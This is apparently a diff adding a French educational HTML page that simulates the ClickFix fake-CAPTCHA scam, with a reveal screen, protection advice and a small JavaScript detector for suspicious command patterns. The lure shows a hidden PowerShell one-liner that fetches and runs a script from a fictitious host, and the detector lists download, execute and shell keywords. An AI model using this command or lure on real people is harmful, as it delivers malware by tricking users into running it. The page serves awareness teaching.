@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vérification de sécurité</title>
+<style>
+
+    :root {
+        --bg: #14161a; --panel: #1c1f25; --panel-2: #22262d; --border: #2e333b;
+        --text: #e7e9ec; --muted: #9aa2ad; --accent: #2f6fed; --accent-hover: #4c84f0;
+        --warn: #e0a63c; --trap: #3ccb7f; --danger: #e0554c;
+    }
+    * { box-sizing: border-box; }
+    body { margin:0; min-height:100vh; background:var(--bg); color:var(--text);
+        font-family:'Segoe UI','Inter',Arial,sans-serif; display:flex; flex-direction:column; }
+    header { background:var(--panel); border-bottom:1px solid var(--border); padding:14px 20px;
+        font-size:0.95em; letter-spacing:0.03em; color:var(--muted); text-transform:uppercase; text-align:center; }
+    main { flex:1; display:flex; align-items:center; justify-content:center; padding:24px; }
+    .card { background:var(--panel); border:1px solid var(--border); border-radius:10px;
+        padding:30px; width:100%; max-width:540px; }
+    h1 { font-size:1.2em; margin:0 0 8px 0; font-weight:700; }
+    .sous-texte { color:var(--muted); font-size:0.87em; margin-bottom:20px; line-height:1.5; }
+    label { display:block; font-size:0.85em; color:var(--muted); margin-bottom:6px; }
+    input[type="text"], input[type="password"], textarea, select { width:100%; background:var(--panel-2);
+        border:1px solid var(--border); color:var(--text); padding:11px 13px; border-radius:6px;
+        font-size:0.95em; font-family:inherit; outline:none; margin-bottom:14px; }
+    textarea { font-family:'Consolas',monospace; min-height:70px; resize:vertical; }
+    input:focus, textarea:focus, select:focus { border-color:var(--accent); }
+    button { font-family:inherit; }
+    button.submit { width:100%; background:var(--accent); color:#fff; border:none; padding:13px;
+        border-radius:6px; font-size:1em; font-weight:600; cursor:pointer; margin-bottom:8px; }
+    button.submit:hover { background:var(--accent-hover); }
+    button.secondaire { width:100%; background:none; border:1px solid var(--border); color:var(--muted);
+        padding:10px; border-radius:6px; font-size:0.85em; cursor:pointer; }
+    button.secondaire:hover { color:var(--text); border-color:var(--accent); }
+    .hint { margin-top:14px; font-size:0.8em; color:var(--muted); line-height:1.5;
+        background:var(--panel-2); border:1px solid var(--border); border-radius:6px; padding:10px 12px; }
+
+    #reveal-screen { display:none; }
+    .reveal-card { background:var(--panel); border:1px solid var(--trap); border-radius:10px;
+        padding:32px; width:100%; max-width:560px; }
+    .reveal-title { font-size:1.35em; font-weight:700; margin:0 0 6px 0; color:var(--trap); }
+    .reveal-sub { color:var(--muted); margin-bottom:20px; }
+    .reveal-explication { font-size:0.92em; line-height:1.6; color:var(--text); }
+    .reveal-explication code { background:var(--panel-2); border:1px solid var(--border);
+        border-radius:4px; padding:1px 6px; }
+    .reveal-btn { margin-top:20px; background:var(--panel-2); border:1px solid var(--border);
+        color:var(--text); padding:10px 16px; border-radius:6px; cursor:pointer; font-size:0.9em; }
+    .reveal-btn:hover { border-color:var(--accent); }
+
+    .correction-box { margin-top:22px; border:1px solid var(--trap); border-radius:8px; overflow:hidden; text-align:left; }
+    .correction-toggle { width:100%; text-align:left; background:rgba(60,203,127,0.08); border:none;
+        color:var(--trap); padding:14px 16px; font-size:0.95em; font-weight:600; cursor:pointer;
+        display:flex; justify-content:space-between; align-items:center; }
+    .correction-content { display:none; padding:16px 18px 20px 18px; font-size:0.88em;
+        line-height:1.6; border-top:1px solid var(--border); }
+    .correction-content h3 { font-size:0.95em; margin:16px 0 6px 0; color:var(--text); }
+    .correction-content h3:first-child { margin-top:0; }
+    .correction-content ul, .correction-content ol { padding-left:20px; margin:6px 0; }
+    .correction-content code { background:var(--panel-2); border:1px solid var(--border);
+        border-radius:4px; padding:1px 6px; }
+    .code-compare { display:grid; grid-template-columns:1fr; gap:10px; margin:8px 0 14px 0; }
+    .code-block { background:var(--panel-2); border:1px solid var(--border); border-radius:6px;
+        padding:10px 12px; font-family:'Consolas',monospace; font-size:0.85em;
+        white-space:pre-wrap; word-break:break-word; }
+    .code-block.bad { border-left:3px solid #e0554c; }
+    .code-block.good { border-left:3px solid var(--trap); }
+    .code-label { font-size:0.78em; color:var(--muted); margin-bottom:4px;
+        text-transform:uppercase; letter-spacing:0.03em; }
+
+    footer { text-align:center; padding:14px; font-size:0.78em; color:var(--muted);
+        border-top:1px solid var(--border); background:var(--panel); }
+    footer a { color:var(--muted); text-decoration:underline; cursor:pointer; }
+    footer a:hover { color:var(--text); }
+    .footer-flag { display:block; margin-bottom:4px; color:var(--warn); font-weight:600; letter-spacing:0.02em; }
+
+    .modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7);
+        align-items:center; justify-content:center; padding:20px; z-index:100; }
+    .modal-box { background:var(--panel); border:1px solid var(--border); border-radius:10px;
+        padding:26px; max-width:480px; font-size:0.9em; line-height:1.6; }
+    .modal-box h2 { margin-top:0; font-size:1.1em; }
+    .modal-close { margin-top:16px; background:var(--accent); border:none; color:#fff;
+        padding:9px 16px; border-radius:6px; cursor:pointer; }
+
+
+    .captcha-box { background:#fff; color:#111; border-radius:10px; padding:24px; margin-bottom:18px;
+        text-align:center; }
+    .captcha-box .titre-captcha { font-weight:700; font-size:1.05em; margin-bottom:14px; }
+    .captcha-check { display:inline-flex; align-items:center; gap:10px; border:1px solid #ccc;
+        border-radius:6px; padding:12px 18px; cursor:pointer; }
+    .captcha-check input { width:20px; height:20px; }
+    .etapes-clickfix { text-align:left; background:var(--panel-2); border:1px solid var(--border);
+        border-radius:8px; padding:16px 18px; margin:16px 0; font-size:0.88em; line-height:1.7; display:none; }
+    .etapes-clickfix b { color:var(--accent); }
+    .code-a-coller { background:#0d0e11; border:1px solid var(--border); border-radius:6px;
+        padding:12px 14px; font-family:'Consolas',monospace; font-size:0.82em; color:#7ee787;
+        margin-bottom:14px; word-break:break-all; text-align:left; display:none; }
+    .analyseur-box { margin-top:10px; }
+    .analyseur-resultat { display:none; margin-top:10px; border-radius:6px; padding:10px 12px;
+        font-size:0.85em; }
+    .analyseur-resultat.danger { background:rgba(224,85,76,0.1); border:1px solid var(--danger); color:var(--danger); }
+    .analyseur-resultat.ok { background:rgba(60,203,127,0.1); border:1px solid var(--trap); color:var(--trap); }
+
+</style>
+</head>
+<body>
+
+<header>🤖 Démo : le faux CAPTCHA (ClickFix)</header>
+
+<main>
+
+    <div id="login-screen" class="card">
+        <h1>Vérification de sécurité</h1>
+        <div class="sous-texte">Cette page (imaginaire) prétend vérifier que vous n'êtes pas un robot avant de vous laisser continuer.</div>
+
+        <div class="captcha-box">
+            <div class="titre-captcha">🤖 Prouvez que vous n'êtes pas un robot</div>
+            <label class="captcha-check">
+                <input type="checkbox" id="captcha-check">
+                <span>Je ne suis pas un robot</span>
+            </label>
+        </div>
+
+        <div class="etapes-clickfix" id="etapes-clickfix">
+            ⚠️ La vérification automatique a échoué. Vérification manuelle requise :<br><br>
+            <b>1.</b> Appuyez sur les touches <b>Windows + R</b><br>
+            <b>2.</b> Collez le code ci-dessous dans la fenêtre qui s'ouvre<br>
+            <b>3.</b> Appuyez sur Entrée
+        </div>
+        <div class="code-a-coller" id="code-a-coller">powershell -w hidden -c "iwr https://verif-captcha-secure.exemple/valider.ps1 | iex"</div>
+
+        <div class="analyseur-box" id="analyseur-box" style="display:none;">
+            <label for="analyseur-input">Colle ici ce que tu as fait (pour valider la démo) :</label>
+            <textarea id="analyseur-input" placeholder="colle la commande ici..."></textarea>
+            <button type="button" class="submit" id="btn-valider">J'ai suivi ces étapes</button>
+        </div>
+
+        <div class="hint">
+            ⚠️ Aucun vrai site ne demande jamais d'ouvrir "Exécuter" (Windows+R) pour se "vérifier".
+        </div>
+    </div>
+
+    <div id="reveal-screen" class="reveal-card">
+        <div class="reveal-title">🎣 Te voilà piégé·e !</div>
+        <div class="reveal-sub">C'était un <strong>ClickFix</strong> — une arnaque en plein essor.</div>
+
+        <div class="reveal-explication">
+            La case à cocher "Je ne suis pas un robot" ne sert qu'à te faire croire à un vrai CAPTCHA. La
+            "vérification manuelle" qui suit te fait exécuter toi-même, volontairement, une commande qui
+            télécharge et lance un vrai logiciel malveillant — sans qu'aucun antivirus n'ait de fichier à
+            bloquer, puisque c'est toi qui l'as "autorisé" en pleine conscience.
+            <br><br>
+            <code>Windows + R</code> ouvre la fenêtre "Exécuter", qui lance directement des commandes système —
+            exactement l'équivalent de la console de navigateur du piège précédent, mais au niveau de tout
+            l'ordinateur, pas juste d'un site web.
+            <br><br>
+            Dans cette démo, aucune commande n'a réellement été envoyée à un serveur — la fausse adresse
+            <code>verif-captcha-secure.exemple</code> n'existe pas.
+        </div>
+
+        <div class="correction-box">
+            <button type="button" class="correction-toggle" id="btn-toggle-correction">
+                <span>🔧 Comment se protéger, pour de vrai ?</span>
+                <span id="correction-chevron">▾</span>
+            </button>
+            <div class="correction-content" id="correction-content">
+                <h3>Le problème</h3>
+                Un vrai CAPTCHA ne demande jamais d'ouvrir un programme système. Cette technique déplace le
+                piège : au lieu de forcer un téléchargement (souvent bloqué par l'antivirus), elle convainc
+                la victime de faire elle-même le travail dangereux.
+
+                <h3>🔬 Essaie un vrai outil d'analyse</h3>
+                Colle n'importe quelle commande ci-dessous : ce détecteur (JS pur, aucun réseau) repère
+                réellement certains motifs dangereux classiques.
+                <div style="margin-top:10px;">
+                    <textarea id="verif-commande" placeholder="colle une commande à analyser..."></textarea>
+                    <button type="button" class="secondaire" id="btn-analyser" style="border-color:var(--trap); color:var(--trap);">🔍 Analyser cette commande</button>
+                    <div class="analyseur-resultat" id="analyseur-resultat"></div>
+                </div>
+
+                <h3>Les règles à retenir</h3>
+                1. Aucun site légitime ne demande jamais d'utiliser "Exécuter" (Windows+R) pour se "vérifier".<br>
+                2. Coller et exécuter une commande qu'on ne comprend pas, c'est donner un accès total à sa machine.<br>
+                3. Ce piège existe aussi sur Mac (Terminal) — le principe est identique.<br>
+                4. Un vrai CAPTCHA se résout en cliquant des images ou en cochant une case, jamais en ouvrant un programme système.
+            </div>
+        </div>
+
+        <button type="button" class="reveal-btn" id="btn-reset">↺ Recommencer</button>
+    </div>
+
+</main>
+
+<footer>
+    <span class="footer-flag">🔒 Page pédagogique — cours de cybersécurité</span>
+    Simulation fictive, aucune commande réellement exécutée. <a id="lien-mentions">Mentions légales</a>
+</footer>
+
+<div class="modal-overlay" id="modal-overlay">
+    <div class="modal-box">
+        <h2>Mentions légales</h2>
+        <p>Cette page est une <strong>reconstitution fictive</strong> créée dans le cadre d'un cours de
+cybersécurité, à des fins pédagogiques uniquement. Aucune commande affichée n'est jamais exécutée par cette
+page, et l'adresse citée n'existe pas.</p>
+<p>Aucune donnée n'est envoyée, transmise, collectée ou conservée par cette page.</p>
+        <button class="modal-close" id="btn-close-modal">Fermer</button>
+    </div>
+</div>
+
+<script>
+
+    // Aucune commande n'est jamais réellement exécutée par cette page — tout est affiché en texte, jamais lancé.
+
+    document.getElementById('captcha-check').addEventListener('change', function() {
+        if (!this.checked) return;
+        this.disabled = true;
+        document.getElementById('etapes-clickfix').style.display = 'block';
+        document.getElementById('code-a-coller').style.display = 'block';
+        document.getElementById('analyseur-box').style.display = 'block';
+    });
+
+    document.getElementById('btn-valider').addEventListener('click', function() {
+        document.getElementById('login-screen').style.display = 'none';
+        document.getElementById('reveal-screen').style.display = 'block';
+    });
+
+    document.getElementById('btn-reset').addEventListener('click', function() {
+        document.getElementById('reveal-screen').style.display = 'none';
+        document.getElementById('login-screen').style.display = 'block';
+        document.getElementById('correction-content').style.display = 'none';
+        document.getElementById('correction-chevron').innerText = '▾';
+        document.getElementById('captcha-check').checked = false;
+        document.getElementById('captcha-check').disabled = false;
+        document.getElementById('etapes-clickfix').style.display = 'none';
+        document.getElementById('code-a-coller').style.display = 'none';
+        document.getElementById('analyseur-box').style.display = 'none';
+        document.getElementById('analyseur-input').value = '';
+    });
+
+    // Vrai mini-analyseur statique : repère quelques motifs dangereux classiques dans une commande collée.
+    function analyserCommande(texte) {
+        const motifs = [
+            { regex: /iwr|invoke-webrequest|curl|wget/i, raison: "télécharge du contenu depuis Internet" },
+            { regex: /iex|invoke-expression/i, raison: "exécute du code téléchargé, sans jamais l'afficher" },
+            { regex: /-w\s+hidden|-windowstyle\s+hidden/i, raison: "essaie de se cacher (fenêtre invisible)" },
+            { regex: /base64|frombase64/i, raison: "du code encodé, souvent utilisé pour dissimuler des instructions" },
+            { regex: /powershell|cmd\.exe|\/bin\/(ba)?sh/i, raison: "lance un interpréteur de commandes système" }
+        ];
+        return motifs.filter(m => m.regex.test(texte));
+    }
+
+    document.getElementById('btn-analyser').addEventListener('click', function() {
+        const texte = document.getElementById('verif-commande').value;
+        const resultat = document.getElementById('analyseur-resultat');
+        if (!texte.trim()) return;
+        const trouves = analyserCommande(texte);
+        resultat.style.display = 'block';
+        if (trouves.length > 0) {
+            resultat.className = 'analyseur-resultat danger';
+            resultat.innerHTML = '🚩 Motifs suspects détectés :<br>' + trouves.map(t => '• ' + t.raison).join('<br>');
+        } else {
+            resultat.className = 'analyseur-resultat ok';
+            resultat.innerText = "Aucun motif dangereux connu détecté dans cette analyse simplifiée — ça ne veut pas dire que c'est forcément sûr, juste qu'aucun des signaux les plus classiques n'apparaît.";
+        }
+    });
+
+
+    document.getElementById('btn-toggle-correction').addEventListener('click', function() {
+        const contenu = document.getElementById('correction-content');
+        const ouvert = contenu.style.display === 'block';
+        contenu.style.display = ouvert ? 'none' : 'block';
+        document.getElementById('correction-chevron').innerText = ouvert ? '▾' : '▴';
+    });
+    document.getElementById('lien-mentions').addEventListener('click', function() {
+        document.getElementById('modal-overlay').style.display = 'flex';
+    });
+    document.getElementById('btn-close-modal').addEventListener('click', function() {
+        document.getElementById('modal-overlay').style.display = 'none';
+    });
+    document.getElementById('modal-overlay').addEventListener('click', function(e) {
+        if (e.target === this) this.style.display = 'none';
+    });
+
+</script>
+
+</body>
+</html>
